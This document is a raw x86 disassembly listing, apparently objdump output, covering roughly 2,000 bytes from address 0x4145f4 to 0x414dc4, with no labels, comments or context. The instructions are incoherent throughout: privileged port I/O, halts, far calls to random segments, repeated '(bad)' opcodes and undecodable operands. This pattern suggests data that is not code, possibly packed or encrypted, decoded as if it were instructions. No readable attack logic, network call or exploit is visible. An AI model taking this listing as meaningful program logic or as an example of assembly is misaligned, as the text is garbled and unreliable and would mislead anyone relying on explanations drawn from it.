  4145f4:	add    ecx,edx
  4145f6:	adc    ah,al
  4145f8:	adc    ah,BYTE PTR [ebp-0x3d]
  4145fb:	ret    0x8fce
  4145fe:	test   DWORD PTR [edx+eax*1+0x36],ebx
  414602:	retf   0x80a4
  414605:	call   0x9c30:0xcd1c8ecd
  41460c:	add    BYTE PTR [esi-0x4dfbfcdd],ch
  414612:	add    al,0xc0
  414614:	inc    eax
  414615:	or     DWORD PTR [ebx+eiz*1-0x43],esp
  414619:	stos   BYTE PTR es:[edi],al
  41461a:	out    dx,al
  41461b:	jne    0x414699
  41461d:	in     al,dx
  41461e:	sbb    bl,BYTE PTR [edx-0x35]
  414621:	ret    0xb704
  414624:	cmp    eax,0xca2c5bf7
  414629:	dec    ebx
  41462a:	fisub  DWORD PTR [edi]
  41462c:	push   ebp
  41462d:	xchg   ebp,eax
  41462e:	or     al,BYTE PTR [eax+0x74]
  414631:	scas   eax,DWORD PTR es:[edi]
  414632:	inc    esi
  414633:	and    esi,ebp
  414635:	icebp  
  414636:	in     al,0x14
  414638:	push   0x12
  41463a:	and    al,0x4c
  41463c:	hlt    
  41463d:	sbb    eax,0x8fc8634a
  414642:	out    0xa8,al
  414644:	sbb    al,0xa4
  414646:	sub    eax,0x88e6333f
  41464b:	nop
  41464c:	dec    eax
  41464d:	call   0xc6e9:0x531e0a44
  414654:	mov    eax,0x5e443e2e
  414659:	push   ebx
  41465a:	or     dl,al
  41465c:	mov    WORD PTR [eax],?
  41465e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41465f:	hlt    
  414660:	inc    edx
  414661:	push   edi
  414662:	inc    esp
  414663:	ret    0x2a6a
  414666:	cmp    BYTE PTR [esi],dh
  414668:	out    dx,al
  414669:	ja     0x4145fc
  41466b:	dec    eax
  41466c:	gs inc esi
  41466e:	push   cs
  41466f:	add    ebx,DWORD PTR [esi-0x25]
  414672:	and    al,0xd1
  414674:	adc    eax,DWORD PTR [ebx+0x6c97079c]
  41467a:	mov    ebp,DWORD PTR [eax+0x306d0e1a]
  414680:	in     eax,dx
  414681:	dec    ebx
  414682:	sub    al,0x97
  414684:	jne    0x41468a
  414686:	or     BYTE PTR [ebx],0xd6
  414689:	mov    bh,BYTE PTR [esi]
  41468b:	add    eax,0x9a90cbdf
  414690:	xchg   esp,eax
  414691:	js     0x4146f7
  414693:	pop    edi
  414694:	sub    eax,0x95b807fb
  414699:	not    BYTE PTR [esi+edx*1+0x38eff92e]
  4146a0:	push   ebx
  4146a1:	dec    edi
  4146a2:	stc    
  4146a3:	or     DWORD PTR [ebp+0x412b490e],esi
  4146a9:	fist   DWORD PTR [ecx+ebp*1]
  4146ac:	lock lods eax,DWORD PTR ds:[esi]
  4146ae:	outs   dx,BYTE PTR ds:[esi]
  4146af:	jg     0x414672
  4146b1:	cmp    BYTE PTR gs:[ecx+0x4ddeb426],al
  4146b8:	jge    0x414726
  4146ba:	clc    
  4146bb:	ins    BYTE PTR es:[edi],dx
  4146bc:	add    DWORD PTR [edi-0x20],ebx
  4146bf:	daa    
  4146c0:	stos   DWORD PTR es:[edi],eax
  4146c1:	pusha  
  4146c2:	out    dx,al
  4146c3:	jmp    0x6487:0xbfb615b4
  4146ca:	or     BYTE PTR [esp+ebp*1-0x15b6e66e],al
  4146d1:	jb     0x414672
  4146d3:	retf   
  4146d4:	mov    al,ds:0x815627d7
  4146d9:	icebp  
  4146da:	repz pop ebp
  4146dc:	pop    esi
  4146dd:	stos   BYTE PTR es:[edi],al
  4146de:	imul   edx,DWORD PTR [edx],0x37
  4146e1:	jg     0x414707
  4146e3:	sub    cl,BYTE PTR [ecx-0x411056ba]
  4146e9:	mov    ebp,0x64f40c48
  4146ee:	xchg   DWORD PTR [edi+0xd277cf6],edi
  4146f4:	(bad)  
  4146f5:	daa    
  4146f6:	adc    esp,DWORD PTR [edx-0x6a58f476]
  4146fc:	pop    ebp
  4146fd:	cdq    
  4146fe:	xor    BYTE PTR [edx-0x6],0xc9
  414702:	xchg   esi,eax
  414703:	hlt    
  414704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414705:	cmc    
  414706:	adc    dl,BYTE PTR [esi]
  414708:	out    dx,al
  414709:	popf   
  41470a:	(bad)  
  41470b:	ror    BYTE PTR [ecx-0x4a],0x18
  41470f:	enter  0xe5d5,0x93
  414713:	xor    eax,0xf8be4939
  414718:	dec    eax
  414719:	jbe    0x414743
  41471b:	scas   eax,DWORD PTR es:[edi]
  41471c:	sbb    cl,dh
  41471e:	mov    esi,DWORD PTR [eax-0x1d]
  414721:	add    eax,0xe7becf6d
  414726:	mov    ebp,0xfb3cf3fb
  41472b:	xor    BYTE PTR [edi],al
  41472d:	xor    al,BYTE PTR [ecx+0x44]
  414730:	ficom  DWORD PTR [ebp-0x623fe564]
  414736:	push   edi
  414737:	les    esp,FWORD PTR [eax+0x44598504]
  41473d:	jl     0x4146f9
  41473f:	imul   eax,DWORD PTR [esp+esi*1],0x4c16bb53
  414746:	push   ss
  414747:	fldenv [ebp+0x2d75d716]
  41474d:	mov    eax,0x493c0837
  414752:	rol    cl,1
  414754:	or     DWORD PTR [edx-0x22],edi
  414757:	xchg   ecx,eax
  414758:	pop    ebx
  414759:	rcr    DWORD PTR [edx],1
  41475b:	push   es
  41475c:	fst    QWORD PTR [ecx+0x10]
  41475f:	xchg   edx,eax
  414760:	mov    dh,0xe5
  414762:	addr16 mov edi,edx
  414765:	and    BYTE PTR [edx],cl
  414767:	xchg   ebp,eax
  414768:	sub    eax,0x372b8655
  41476d:	imul   eax,DWORD PTR [ecx+edx*8-0x72334609],0x31aa6896
  414778:	pop    esi
  414779:	ret    0xf27a
  41477c:	xor    BYTE PTR [edi],ah
  41477e:	pop    es
  41477f:	dec    esp
  414780:	dec    ecx
  414781:	dec    esp
  414782:	pop    ss
  414783:	hlt    
  414784:	jb     0x414774
  414786:	add    ch,bl
  414788:	pop    ds
  414789:	cmc    
  41478a:	jmp    0x4147d4
  41478c:	and    eax,DWORD PTR [ebx+0x2c]
  41478f:	test   esi,ebx
  414791:	repz jmp 0xa54a:0x63ee72cc
  414799:	add    BYTE PTR [eax-0x2d],ch
  41479c:	sub    DWORD PTR [edi-0x1e],eax
  41479f:	adc    BYTE PTR [ecx],cl
  4147a1:	mov    ah,0x12
  4147a3:	add    dl,cl
  4147a5:	js     0x414730
  4147a7:	mov    BYTE PTR [eax-0x8],ch
  4147aa:	mov    dl,0xaa
  4147ac:	sub    DWORD PTR [edi-0x7a6a201c],0x36
  4147b3:	add    al,0x88
  4147b5:	ret    
  4147b6:	mov    WORD PTR [eax*4+0x10532e28],ds
  4147bd:	sub    BYTE PTR [edi-0x24e2d35d],al
  4147c3:	adc    ebp,edx
  4147c5:	fbstp  TBYTE PTR [ebx]
  4147c7:	adc    edx,DWORD PTR [esi-0x1b]
  4147ca:	mov    dh,0xb6
  4147cc:	mov    bh,0xb9
  4147ce:	adc    al,0x60
  4147d0:	push   ebx
  4147d1:	adc    BYTE PTR [eax+0x1e],cl
  4147d4:	mov    ah,0x52
  4147d6:	mov    eax,ds:0x632a4b7d
  4147db:	ins    DWORD PTR es:[edi],dx
  4147dc:	and    ah,BYTE PTR [ecx-0x1e7f7d56]
  4147e2:	lods   al,BYTE PTR ds:[esi]
  4147e3:	cmp    bh,cl
  4147e5:	jmp    0x414832
  4147e7:	xchg   BYTE PTR [edx-0x1c],dh
  4147ea:	inc    esi
  4147eb:	mov    cl,0x10
  4147ed:	cmp    bh,BYTE PTR [edx-0x5d54b6c]
  4147f3:	rcr    ch,1
  4147f5:	xchg   ecx,eax
  4147f6:	sub    cl,BYTE PTR [ecx-0x183efbbb]
  4147fc:	mov    DWORD PTR [ebp+0x6],0xa2d49974
  414803:	xchg   esi,eax
  414804:	mov    esp,0x52b6e09a
  414809:	adc    DWORD PTR [ebp+0x6e2b694b],esp
  41480f:	lds    edx,FWORD PTR [edx]
  414811:	test   eax,0x61eecd7e
  414816:	push   ecx
  414817:	cs pop esp
  414819:	pop    edi
  41481a:	repnz mov cs,WORD PTR [ecx-0x15df4b36]
  414821:	mov    DWORD PTR [ebp-0x6c],eax
  414824:	loopne 0x414857
  414826:	xchg   esi,eax
  414827:	cld    
  414828:	aas    
  414829:	jg     0x41481e
  41482b:	cmp    ch,dh
  41482d:	call   0xab02:0x6b7b86ec
  414834:	pop    ebp
  414835:	stc    
  414836:	js     0x414862
  414838:	out    dx,eax
  414839:	ret    0x329b
  41483c:	out    0x44,eax
  41483e:	shl    BYTE PTR [eax+0x354e0ebb],1
  414844:	fstp   DWORD PTR [esi+0x4e]
  414847:	or     dl,BYTE PTR [eax]
  414849:	and    BYTE PTR [edi+edi*2],dh
  41484c:	sahf   
  41484d:	mov    al,BYTE PTR [esp+eiz*8]
  414850:	or     ebp,ebp
  414852:	not    DWORD PTR [esi-0x60]
  414855:	pop    esp
  414856:	jmp    0x4674b70c
  41485b:	sub    DWORD PTR [edi-0x19],eax
  41485e:	jnp    0x41481b
  414860:	sbb    BYTE PTR [edx-0x71],0x83
  414864:	dec    esp
  414865:	mov    es,esi
  414867:	jg     0x41486c
  414869:	push   edi
  41486a:	or     al,0xd1
  41486c:	inc    esp
  41486d:	rol    BYTE PTR [edi],1
  41486f:	stos   BYTE PTR es:[edi],al
  414870:	ja     0x414863
  414872:	jecxz  0x414815
  414874:	inc    edi
  414875:	cmp    DWORD PTR [esi-0x5c],ebx
  414878:	sbb    BYTE PTR [ecx],bh
  41487a:	xor    WORD PTR [ebx+0x15f33b27],bp
  414881:	xchg   edx,eax
  414882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414883:	les    esi,FWORD PTR [ebx]
  414885:	bound  ecx,QWORD PTR [ebx+0x46e24f1d]
  41488b:	dec    esi
  41488c:	dec    edi
  41488d:	ror    DWORD PTR [ebp+0x2],cl
  414890:	fcom   DWORD PTR [eax-0xfcd2d97]
  414896:	adc    ch,BYTE PTR [edx+0x5f6c2329]
  41489c:	ret    
  41489d:	pusha  
  41489e:	fsubr  QWORD PTR [esi+0x72]
  4148a1:	inc    ebp
  4148a2:	mov    ds:0x84486863,eax
  4148a7:	sbb    eax,DWORD PTR [eax]
  4148a9:	xchg   ebp,eax
  4148aa:	add    dl,BYTE PTR [esi]
  4148ac:	dec    esp
  4148ad:	inc    ebp
  4148ae:	ins    BYTE PTR es:[edi],dx
  4148af:	pushf  
  4148b0:	pop    edi
  4148b1:	test   DWORD PTR [edi+edi*2],0xee288bae
  4148b8:	(bad)  
  4148b9:	gs dec esi
  4148bb:	loope  0x414919
  4148bd:	bound  ebp,QWORD PTR ds:0x65134807
  4148c3:	push   eax
  4148c4:	jmp    FWORD PTR [esi]
  4148c6:	adc    al,0x63
  4148c8:	mov    edi,0x886e60d8
  4148cd:	pop    ecx
  4148ce:	(bad)  
  4148cf:	cmp    ecx,DWORD PTR [ebx-0x6dc89ec5]
  4148d5:	out    dx,eax
  4148d6:	pushf  
  4148d7:	pop    eax
  4148d8:	test   DWORD PTR [ebx],ebp
  4148da:	inc    ebp
  4148db:	dec    ebp
  4148dc:	xlat   BYTE PTR ds:[ebx]
  4148dd:	daa    
  4148de:	cmp    al,0x0
  4148e0:	call   0x9a4c:0x7be6c05c
  4148e7:	std    
  4148e8:	sti    
  4148e9:	fadd   DWORD PTR [ebx+0x90c7337]
  4148ef:	loopne 0x414929
  4148f1:	(bad)  
  4148f2:	je     0x41494b
  4148f4:	stos   BYTE PTR es:[di],al
  4148f6:	inc    edi
  4148f7:	mov    edx,0xb47d487f
  4148fc:	cli    
  4148fd:	outs   dx,BYTE PTR ds:[esi]
  4148fe:	xlat   BYTE PTR ds:[ebx]
  4148ff:	dec    edi
  414900:	das    
  414901:	ds xchg DWORD PTR ss:[esi-0x23],ebx
  414906:	sub    DWORD PTR [edx],ebx
  414908:	jmp    0x414915
  41490a:	inc    eax
  41490b:	imul   ebp,DWORD PTR [ebx-0x2c],0x3243cc7e
  414912:	mov    ?,WORD PTR [ebp-0x42]
  414915:	jo     0x4148c2
  414917:	shl    BYTE PTR [eax+ecx*2-0x17],1
  41491b:	push   ebx
  41491c:	fwait
  41491d:	inc    ebx
  41491e:	fwait
  41491f:	sbb    bh,BYTE PTR [edi-0x2a2af048]
  414925:	pop    ebp
  414926:	pop    esi
  414927:	aas    
  414928:	dec    ebx
  414929:	jnp    0x41491b
  41492b:	cmc    
  41492c:	stc    
  41492d:	or     DWORD PTR [esi-0x14368545],esp
  414933:	loope  0x414949
  414935:	out    0x9b,eax
  414937:	or     BYTE PTR [edi-0x11eb4cc8],al
  41493d:	mov    edi,0xf210a44f
  414942:	push   0x23
  414944:	mov    ds:0xac9e31ec,eax
  414949:	loopne 0x41491e
  41494b:	hlt    
  41494c:	jmp    0x76c7de51
  414951:	mov    ecx,DWORD PTR [eax]
  414953:	mov    ds:0xe48270f2,al
  414958:	es push cs
  41495a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41495b:	cs pushf 
  41495d:	add    eax,0xa9ce9bde
  414962:	xchg   ebp,eax
  414963:	inc    ecx
  414964:	(bad)  
  414965:	in     eax,dx
  414966:	aam    0x85
  414968:	jb     0x414979
  41496a:	sti    
  41496b:	pop    gs
  41496d:	xor    eax,0x9753f277
  414972:	dec    esi
  414973:	add    DWORD PTR [ebx-0x536c65d],edi
  414979:	lods   al,BYTE PTR ds:[esi]
  41497a:	aas    
  41497b:	rol    DWORD PTR [ebp-0x28],0x63
  41497f:	aam    0xc5
  414981:	push   ss
  414982:	pop    edi
  414983:	sub    DWORD PTR [edi],0x5d
  414986:	dec    ebp
  414987:	add    bl,BYTE PTR [eax]
  414989:	add    al,0x43
  41498b:	pop    ebx
  41498c:	cmp    eax,0xc7f2d88f
  414991:	rcl    esi,1
  414993:	xor    BYTE PTR [ebx+0x65],0x9b
  414997:	dec    esi
  414998:	push   cs
  414999:	loope  0x4149e6
  41499b:	stos   DWORD PTR es:[edi],eax
  41499c:	jns    0x41497f
  41499e:	xlat   BYTE PTR ds:[ebx]
  41499f:	mov    edx,0x9df9d04f
  4149a4:	pop    esi
  4149a5:	std    
  4149a6:	sbb    eax,0xd2a6aa9
  4149ab:	stos   BYTE PTR es:[edi],al
  4149ac:	pop    ebp
  4149ad:	cmp    DWORD PTR [ebx+0x35],esp
  4149b0:	loope  0x414a07
  4149b2:	aaa    
  4149b3:	cmp    al,0x4e
  4149b5:	sbb    ecx,DWORD PTR [ebx+ebx*2+0x46]
  4149b9:	mov    ch,0xeb
  4149bb:	adc    eax,0xf86ffa24
  4149c0:	nop
  4149c1:	nop
  4149c2:	cmp    al,0x77
  4149c4:	in     al,0xa8
  4149c6:	ss xor eax,0xf526471c
  4149cc:	(bad)  
  4149cd:	imul   dl
  4149cf:	icebp  
  4149d0:	loope  0x414959
  4149d2:	mov    ds:0xe85d0e3f,al
  4149d7:	mov    ch,0xc3
  4149da:	lea    ebx,[edx-0x4d]
  4149dd:	mov    DWORD PTR [esi],ebx
  4149df:	popa   
  4149e0:	fild   DWORD PTR [esi+0x11ee977e]
  4149e6:	loop   0x414a4b
  4149e8:	mov    BYTE PTR [ebp+0xb],ch
  4149eb:	ss in  al,0xa7
  4149ee:	jmp    0x3cf9:0x2d32224f
  4149f5:	cmp    eax,0xb52134a5
  4149fa:	or     cl,BYTE PTR [ecx]
  4149fc:	jle    0x4149b0
  4149fe:	mov    al,ds:0x72ef0f90
  414a03:	loop   0x414a07
  414a05:	les    esp,FWORD PTR [edx+0x784a5a27]
  414a0b:	push   ds
  414a0c:	je     0x4149f3
  414a0e:	pusha  
  414a0f:	push   edx
  414a10:	xor    esi,DWORD PTR [esi+0x3283e54]
  414a16:	jl     0x414a0e
  414a18:	fsubr  DWORD PTR [ebp+0x11]
  414a1b:	dec    esi
  414a1c:	mov    ds:0xc63a019f,eax
  414a21:	loope  0x414a8f
  414a23:	mov    ch,0xb4
  414a25:	sbb    BYTE PTR [edx-0xcd2a9e2],ah
  414a2b:	cwde   
  414a2c:	mov    bh,0x15
  414a2e:	pop    ecx
  414a2f:	ret    0x5f5b
  414a32:	fs push ebx
  414a34:	mov    ebx,DWORD PTR [edi+0x4786bad2]
  414a3a:	jge    0x414a9f
  414a3c:	or     BYTE PTR [edi-0x18ce6adf],bh
  414a42:	fs pop di
  414a45:	jp     0x414a9e
  414a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a48:	mov    DWORD PTR [edi-0x19],ebx
  414a4b:	pop    ss
  414a4c:	add    cl,BYTE PTR [eax-0x4c]
  414a4f:	sub    ebx,DWORD PTR [esi-0x60a14d92]
  414a55:	mov    ds:0x58de3fcd,al
  414a5a:	ins    BYTE PTR es:[edi],dx
  414a5b:	push   esp
  414a5c:	stos   DWORD PTR es:[edi],eax
  414a5d:	add    eax,0x9a954c9
  414a62:	and    al,0x2e
  414a64:	mov    cl,0x25
  414a66:	arpl   WORD PTR [edi-0x63c4e712],ax
  414a6c:	pop    es
  414a6d:	dec    eax
  414a6e:	sub    BYTE PTR [ecx],0x78
  414a71:	pop    ecx
  414a72:	push   eax
  414a73:	shl    DWORD PTR [edi],1
  414a75:	xchg   esp,eax
  414a76:	lea    esi,[edi]
  414a78:	das    
  414a79:	clc    
  414a7a:	pop    ecx
  414a7b:	mov    bh,0xee
  414a7d:	adc    ebp,DWORD PTR [esi+ecx*8+0x476784a6]
  414a84:	dec    BYTE PTR [ecx-0x34]
  414a87:	aaa    
  414a88:	mov    bh,0x31
  414a8a:	inc    ecx
  414a8b:	fdivrp st(0),st
  414a8d:	clc    
  414a8e:	pop    ecx
  414a8f:	sbb    eax,0xdefad668
  414a94:	cwde   
  414a95:	arpl   WORD PTR [eax-0x7c],cx
  414a98:	fsubp  st(3),st
  414a9a:	ins    DWORD PTR es:[edi],dx
  414a9b:	mov    bl,0xe9
  414a9d:	mov    al,ds:0x11cbcb24
  414aa2:	xchg   ebx,eax
  414aa3:	cmp    al,0x99
  414aa5:	test   eax,ebx
  414aa7:	sqrtps xmm1,XMMWORD PTR [esi]
  414aaa:	push   eax
  414aab:	rcr    DWORD PTR [ebp-0x2],0x3c
  414aaf:	test   al,0x70
  414ab1:	and    DWORD PTR [edx-0x2d167de4],ecx
  414ab7:	xor    DWORD PTR [ebx-0xb2a1349],ebx
  414abd:	xlat   BYTE PTR ss:[ebx]
  414abf:	mov    eax,0x925c6e73
  414ac4:	pop    es
  414ac5:	enter  0xd5a8,0x8e
  414ac9:	jb     0x414aa4
  414acb:	add    BYTE PTR [ebp+0x1afa4ea5],0x66
  414ad2:	push   esi
  414ad3:	cmp    DWORD PTR [ecx],ebp
  414ad5:	xor    bl,bh
  414ad7:	test   DWORD PTR [esp+eiz*2],0x760dc188
  414ade:	retf   0xa1f8
  414ae1:	jne    0x414a71
  414ae3:	fcmovu st,st(2)
  414ae5:	mov    eax,ds:0xf53dc114
  414aea:	pop    esp
  414aeb:	rol    DWORD PTR [ecx+0x6e29fe7],0xee
  414af2:	xchg   ebp,eax
  414af3:	mov    edx,0xc5e3f59b
  414af8:	hlt    
  414af9:	imul   edi,DWORD PTR [esi+0x55c9125],0x4f70731c
  414b03:	les    esp,FWORD PTR [ebx-0x48]
  414b06:	leave  
  414b07:	jo     0x414a99
  414b09:	push   ss
  414b0a:	scas   al,BYTE PTR es:[edi]
  414b0b:	ds in  eax,0x9a
  414b0e:	ss cmp dh,dl
  414b11:	mov    ds:0xcb7d2a20,eax
  414b16:	inc    edi
  414b17:	and    al,BYTE PTR [ebp+0x1c]
  414b1a:	out    dx,al
  414b1b:	mov    al,ds:0x251eec4a
  414b20:	ins    DWORD PTR es:[edi],dx
  414b21:	in     al,0x2c
  414b23:	jge    0x414b1d
  414b25:	dec    ebp
  414b26:	pop    ds
  414b27:	ret    
  414b28:	pop    edi
  414b29:	(bad)  
  414b2b:	adc    ch,ch
  414b2d:	pushf  
  414b2e:	and    al,0xd8
  414b30:	mov    WORD PTR [ecx-0x59],ds
  414b33:	jae    0x414b00
  414b35:	lods   al,BYTE PTR ds:[esi]
  414b36:	sbb    DWORD PTR [eax*1+0x110aaa33],0x6e
  414b3e:	adc    eax,0xc1ea8827
  414b43:	push   es
  414b44:	xchg   ecx,eax
  414b45:	cwde   
  414b46:	xlat   BYTE PTR ds:[ebx]
  414b48:	sbb    DWORD PTR [edi+ebp*8-0x6ad5994a],eax
  414b4f:	lahf   
  414b50:	fs test eax,0x31b21009
  414b56:	xor    eax,0x107e16c4
  414b5b:	fwait
  414b5c:	pop    esp
  414b5d:	mov    ds:0xf0e2159a,al
  414b62:	int    0x42
  414b64:	cli    
  414b65:	cmp    al,0x53
  414b67:	xor    DWORD PTR [esi+0x4c],ecx
  414b6a:	or     eax,0x61db56c5
  414b6f:	out    dx,eax
  414b70:	aas    
  414b71:	jae    0x414b6e
  414b73:	pop    esp
  414b74:	xor    al,bh
  414b76:	cmp    DWORD PTR [ebp+0x774b82a3],ecx
  414b7c:	stos   DWORD PTR es:[edi],eax
  414b7d:	pop    eax
  414b7e:	in     al,dx
  414b7f:	jae    0x414b8d
  414b81:	pop    ebx
  414b82:	ss sahf 
  414b84:	imul   eax,DWORD PTR [edi],0x4e
  414b87:	lock and BYTE PTR [ebx-0x47],dl
  414b8b:	es aam 0x5
  414b8e:	cli    
  414b8f:	(bad)
  414b92:	shr    BYTE PTR [ebx],0xc1
  414b95:	jo     0x414b3b
  414b97:	pop    esi
  414b98:	inc    eax
  414b99:	clc    
  414b9a:	das    
  414b9b:	ss data16 and al,0x2b
  414b9f:	dec    esp
  414ba0:	aaa    
  414ba1:	pushf  
  414ba2:	push   esi
  414ba3:	ins    BYTE PTR es:[edi],dx
  414ba4:	ret    
  414ba5:	jmp    0x414b65
  414ba7:	xchg   esp,eax
  414ba8:	mov    cl,0x16
  414baa:	lahf   
  414bab:	jmp    0x9e76:0xb58c8949
  414bb2:	pop    es
  414bb3:	mov    edi,0xa2c0e519
  414bb8:	jle    0x414b8f
  414bba:	fidivr WORD PTR es:[ebx+0x75]
  414bbe:	sbb    al,0xfe
  414bc0:	mov    al,BYTE PTR es:[esi]
  414bc3:	int3   
  414bc4:	loope  0x414bfc
  414bc6:	xchg   esi,eax
  414bc7:	sub    al,0xe1
  414bc9:	dec    esi
  414bca:	xchg   esi,eax
  414bcb:	packssdw mm6,mm0
  414bce:	test   al,0x61
  414bd0:	or     eax,0x7b289781
  414bd5:	cdq    
  414bd6:	stc    
  414bd7:	call   0xbcdd49ae
  414bdc:	mov    BYTE PTR [esi-0x2bd51372],dh
  414be2:	inc    ebp
  414be3:	nop
  414be4:	push   ecx
  414be5:	inc    ecx
  414be6:	hlt    
  414be7:	ror    DWORD PTR [eax+0x4942ba72],cl
  414bed:	test   DWORD PTR [edx+0x14],0x603018d5
  414bf4:	xchg   edx,eax
  414bf5:	cwde   
  414bf6:	add    esp,DWORD PTR [ebp+edx*8-0x36]
  414bfa:	xchg   edi,eax
  414bfb:	adc    eax,0xb4fdaa9
  414c00:	jb     0x414b99
  414c02:	ret    0xa76f
  414c05:	test   DWORD PTR ds:0x92c7e1af,eax
  414c0b:	lods   al,BYTE PTR ds:[esi]
  414c0c:	mov    ah,0x81
  414c0e:	inc    esp
  414c0f:	push   ecx
  414c10:	ror    BYTE PTR [eax-0xa95f17f],0x6c
  414c17:	cdq    
  414c18:	popf   
  414c19:	add    ch,dl
  414c1b:	fimul  DWORD PTR [edx+0x1c]
  414c1e:	mov    ebx,0xf383ec55
  414c23:	xor    eax,0x7dfe542e
  414c28:	pop    esi
  414c29:	dec    ebx
  414c2a:	stos   BYTE PTR es:[edi],al
  414c2b:	inc    esp
  414c2c:	in     al,dx
  414c2d:	out    0xdb,eax
  414c2f:	icebp  
  414c30:	test   BYTE PTR [ebx-0x11],0x99
  414c34:	(bad)  
  414c35:	shr    BYTE PTR [esi],0xd5
  414c38:	shl    BYTE PTR [edi+0x2d],1
  414c3b:	push   edx
  414c3c:	dec    ebx
  414c3d:	(bad)  
  414c3e:	xchg   ecx,eax
  414c3f:	jge    0x414c3e
  414c41:	mov    ebx,0x4a0532d0
  414c46:	in     al,0x46
  414c48:	mov    ch,0xbd
  414c4a:	into   
  414c4b:	imul   edi,DWORD PTR [esi+0x36],0x39738b57
  414c52:	(bad)  
  414c53:	xor    BYTE PTR [ebp+0xa],0xf3
  414c57:	pop    ss
  414c58:	fisubr DWORD PTR [ebp+0x6e]
  414c5b:	xchg   ebp,eax
  414c5d:	ret    0xede5
  414c60:	and    al,0x84
  414c62:	sub    al,cl
  414c64:	push   edi
  414c65:	lock xor DWORD PTR [edx],esi
  414c68:	xor    DWORD PTR [ebx+esi*8],0x210bf53c
  414c6f:	inc    ebp
  414c70:	dec    ebp
  414c71:	jae    0x414ca1
  414c73:	xchg   ebx,eax
  414c74:	or     edi,DWORD PTR ds:0x9b28b5f5
  414c7a:	mov    ebx,DWORD PTR [eax]
  414c7c:	mov    ecx,0x6010eb47
  414c81:	in     eax,0x37
  414c83:	lods   al,BYTE PTR ds:[esi]
  414c84:	jle    0x414ce0
  414c86:	push   ds
  414c87:	cmp    dl,BYTE PTR [eax+0xab359e3]
  414c8d:	inc    edi
  414c8e:	mov    ebx,0x83b575
  414c93:	ret    0x894a
  414c96:	in     eax,dx
  414c97:	mov    eax,0x46ede9f9
  414c9c:	stos   BYTE PTR es:[edi],al
  414c9d:	sbb    DWORD PTR [eax],ebx
  414c9f:	or     DWORD PTR [ecx-0xaf031fe],ecx
  414ca5:	ret    0xb994
  414ca8:	xor    DWORD PTR [esi+0x1feb35fc],eax
  414cae:	mov    edi,0x3862b3bc
  414cb3:	sbb    al,dh
  414cb5:	fsubr  QWORD PTR [esp+ecx*4-0x604f40bd]
  414cbc:	cli    
  414cbd:	in     eax,0x65
  414cbf:	ss cli 
  414cc1:	inc    eax
  414cc2:	imul   ebx,DWORD PTR [ebp-0x4919f11e],0xffffffd3
  414cc9:	pop    ecx
  414cca:	mov    edi,0x5934045d
  414ccf:	je     0x414ce0
  414cd1:	call   0xe1fd:0x35448c70
  414cd8:	jnp    0x414cbf
  414cda:	call   0x79c5:0x4e6f9984
  414ce1:	pop    ebp
  414ce2:	sbb    eax,0x8077e12
  414ce7:	test   eax,0xad865202
  414cec:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cee:	ins    BYTE PTR es:[edi],dx
  414cef:	dec    ebx
  414cf0:	mov    ch,0xff
  414cf2:	mov    ebx,0x453cf5c5
  414cf7:	scas   al,BYTE PTR es:[edi]
  414cf8:	cli    
  414cf9:	push   ss
  414cfa:	fidivr WORD PTR [edx+0x5ca36657]
  414d00:	xchg   ebp,eax
  414d01:	jae    0x414d1e
  414d03:	mov    ebp,0x42fdbd48
  414d08:	test   eax,0x1af60f54
  414d0d:	retf   
  414d0e:	mov    bl,0x18
  414d10:	mov    esp,0x5a9d1717
  414d15:	adc    eax,0x6e4cd795
  414d1a:	jb     0x414cf7
  414d1c:	jns    0x414cc0
  414d1e:	mov    bh,0xb4
  414d20:	cli    
  414d21:	cmova  esp,DWORD PTR [ebx]
  414d24:	pop    es
  414d25:	rol    DWORD PTR [ecx],cl
  414d27:	add    DWORD PTR [edi+0x12],edi
  414d2a:	pop    esi
  414d2b:	mov    ebp,0x3cf85c51
  414d30:	push   ebx
  414d31:	cli    
  414d32:	sub    al,0xa0
  414d34:	fs dec edx
  414d36:	outs   dx,DWORD PTR ds:[esi]
  414d37:	xor    BYTE PTR [eax-0x38050128],0xac
  414d3e:	ja     0x414d6f
  414d40:	mov    dh,bl
  414d42:	in     al,0xff
  414d44:	jne    0x414d97
  414d46:	pop    esi
  414d47:	xchg   ecx,eax
  414d48:	ins    BYTE PTR es:[edi],dx
  414d49:	sub    BYTE PTR ds:0xf088ab1f,ah
  414d4f:	je     0x414cfe
  414d51:	xchg   esp,eax
  414d52:	add    BYTE PTR [ebp+0x22357449],bl
  414d58:	das    
  414d59:	mov    ebp,cs
  414d5b:	lods   al,BYTE PTR ds:[esi]
  414d5c:	cwde   
  414d5d:	bound  edi,QWORD PTR [edi+0x50]
  414d60:	xchg   ebp,eax
  414d61:	sub    BYTE PTR [esi+0x10bfdba8],0xd2
  414d68:	aas    
  414d69:	sub    al,0x5f
  414d6b:	in     eax,0x8f
  414d6d:	clc    
  414d6e:	mov    bl,0xb3
  414d70:	mov    ebp,cs
  414d72:	mov    esi,0x24ea9749
  414d77:	outs   dx,BYTE PTR ds:[esi]
  414d78:	dec    esi
  414d79:	push   ebx
  414d7a:	cwde   
  414d7b:	or     DWORD PTR [eax-0x45],esi
  414d7e:	daa    
  414d7f:	cmp    DWORD PTR [edx+ebp*1],esp
  414d82:	sub    esp,edx
  414d84:	dec    esp
  414d85:	fsubrp st(7),st
  414d87:	adc    al,0x24
  414d89:	sbb    ebp,DWORD PTR [ebp-0x6f8f13f2]
  414d8f:	jo     0x414d42
  414d91:	mov    eax,0x37ec6c2a
  414d96:	aaa    
  414d97:	imul   edi,DWORD PTR [eax],0xfffffff1
  414d9a:	push   ds
  414d9b:	jo     0x414db2
  414d9d:	jecxz  0x414dd0
  414d9f:	mov    dh,0x43
  414da1:	pushf  
  414da2:	sub    BYTE PTR [eax+esi*4-0x56],ch
  414da6:	(bad)  
  414da7:	cmp    bl,BYTE PTR [ecx-0x7e]
  414daa:	ds out 0xa7,al
  414dad:	rol    ecx,cl
  414daf:	fwait
  414db0:	push   es
  414db1:	repz xor ebx,0xfd9aff53
  414db8:	sbb    ebx,ebx
  414dba:	adc    eax,0xef104155
  414dbf:	adc    al,0x7c
  414dc1:	lods   al,BYTE PTR ds:[esi]
  414dc2:	in     al,dx
  414dc3:	push   es
  414dc4:	or     eax,0x8f6a8db5
